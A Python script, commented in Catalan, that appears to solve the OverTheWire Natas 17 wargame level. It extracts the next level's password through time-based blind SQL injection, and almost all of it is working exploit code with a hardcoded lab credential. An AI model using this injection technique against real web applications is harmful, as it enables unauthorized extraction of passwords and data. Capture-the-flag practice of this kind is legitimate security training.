import requests,string 

# Configuració de la URL i credencials
url = "http://natas17.natas.labs.overthewire.org/" 
username = "natas17"
password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"
# Caràcters a provar per a la cerca
characters = ['4', '6', '8', 'a', 'g', 'k', 'n', 'o', 'q', 'u', 'v', 'w', 'x', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'L', 'N', 'P', 'Q', 'R', 'U', 'V', 'Z']
# Headers per a la sol·licitud HTTP POST 
headers = {'content-type': 'application/x-www-form-urlencoded'}

# Variable per emmagatzemar la contrasenya
secret = ''

# Bucle extern per iterar sobre les posicions de la contrasenya
for place in range(1,32):
    # Bucle intern per iterar sobre cada caràcter a provar
    for char in characters:
        # Construcció del payload amb injecció SQL per provar cada caràcter de la contrasenya
        payload = 'username=natas18%22%20and%20password%20like%20binary%20'{0}%25'%20and%20sleep(1)%23'.format(secret + char)
        # Realització de la sol·licitud HTTP POST amb el payload, les credencials i els headers
        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=(username,password), data=payload, headers=headers)
        # Comprovació del temps de resposta del servidor per determinar si la conjetura és correcta
        if(r.elapsed.seconds >= 1): 
            # Si la conjetura és correcta, afegim el caràcter a la contrasenya i l'imprimim
            secret += char
            print(char)
# Imprimim la contrasenya final            
print(secret)